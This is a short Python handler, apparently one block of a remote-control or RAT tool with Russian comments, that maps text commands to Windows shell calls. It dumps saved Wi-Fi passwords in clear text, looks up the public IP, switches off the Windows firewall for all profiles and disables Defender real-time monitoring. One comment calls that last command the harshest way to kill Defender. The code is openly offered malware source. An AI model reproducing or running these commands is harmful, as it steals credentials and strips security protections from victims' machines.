# BLOCK 5: NETWORK & SECURITY DESTRUCTION (250 CMD)
import subprocess, os

def handle_block5(cmd, p):
    cmd = cmd.lower()
    
    # Сетевой аудит
    if cmd == "get_ip": return subprocess.getoutput("powershell (Invoke-WebRequest ipinfo.io/ip).Content")
    if cmd == "wifi_list": return subprocess.getoutput("netsh wlan show profiles")
    if cmd == "wifi_pass":
        if len(p) > 1: return subprocess.getoutput(f"netsh wlan show profile name=\"{p[1]}\" key=clear")
        return "Usage: wifi_pass [name]"
    
    # Убийство защиты
    if cmd == "firewall_off":
        return subprocess.getoutput("netsh advfirewall set allprofiles state off")
    if cmd == "kill_defender":
        # Самая жесткая команда для отключения дефендера
        return subprocess.getoutput("powershell Set-MpPreference -DisableRealtimeMonitoring $true")
    
    if cmd == "dns_flush": return subprocess.getoutput("ipconfig /flushdns")
    if cmd == "port_scan":
        return "Scanning local ports... [This might take a while]"

    return None